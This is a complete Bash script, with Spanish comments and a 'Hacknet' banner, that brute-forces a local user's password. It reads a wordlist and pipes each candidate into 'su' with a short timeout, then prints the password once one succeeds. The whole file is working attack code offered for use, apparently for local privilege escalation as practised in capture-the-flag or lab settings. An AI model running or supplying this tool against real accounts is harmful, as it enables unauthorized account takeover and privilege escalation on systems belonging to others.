#!/bin/bash

# --- Configuración de Hacknet ---
# Paleta de colores para una terminal estilo ciberseguridad
GREEN="\e[1;32m"
RED="\e[1;31m"
BLUE="\e[1;34m"
YELLOW="\e[1;33m"
RESET="\e[0m"

mostrar_ayuda() {
    echo -e "${YELLOW}Uso: $0 <USUARIO> <DICCIONARIO>${RESET}"
    exit 1
}

imprimir_banner() {
    echo -e "${BLUE}"
    echo "    __  __            _    _   _ ______ _______ "
    echo "   / / / /           | |  | \ | |  ____|__   __|"
    echo "  / /_/ /  ____  ____| | _|  \| | |__     | |   "
    echo " / __  /  / _  |/ ___| |/ / . \ |  __|    | |   "
    echo "/ / / /  / (_| | |___|   <| |\  | |____   | |   "
    echo -e "/_/ /_/   \____|\____|_|\_\_| \_|______|  |_|  "
    echo -e "          [ Sudo BruteForce v1.0 ]${RESET}\n"
}

finalizar() {
    echo -e "${RED}\n[!] Ataque interrumpido. Saliendo...${RESET}"
    exit 0
}

# Captura de CTRL+C
trap finalizar SIGINT

# --- Validación de Argumentos ---
usuario=$1
diccionario=$2

if [[ $# -ne 2 ]]; then
    mostrar_ayuda
fi

if [[ ! -f $diccionario ]]; then
    echo -e "${RED}[!] Error: El archivo '$diccionario' no existe.${RESET}"
    exit 1
fi

# --- Inicio del Ataque ---
imprimir_banner
echo -e "${YELLOW}[*] Objetivo:   ${RESET}$usuario"
echo -e "${YELLOW}[*] Diccionario:${RESET} $diccionario"
echo -e "------------------------------------------"

while IFS= read -r password; do
    # Efecto de sobreescritura para mantener la terminal limpia
    echo -ne "${BLUE}[?] Probando: ${RESET}${password:0:25}...\r"

    # Intento de autenticación vía PIPE al comando SU
    # El timeout de 0.5s previene bloqueos por procesos lentos
    if echo "$password" | timeout 0.5 su "$usuario" -c "exit" > /dev/null 2>&1; then
        echo -e "\n\n${GREEN}[✔] ¡ACCESO CONCEDIDO!${RESET}"
        echo -e "${GREEN}[+] Usuario:    ${RESET}$usuario"
        echo -e "${GREEN}[+] Contraseña: ${RESET}$password"
        exit 0
    fi
done < "$diccionario"

echo -e "\n${RED}[!] Ataque finalizado. No se encontró coincidencia.${RESET}"
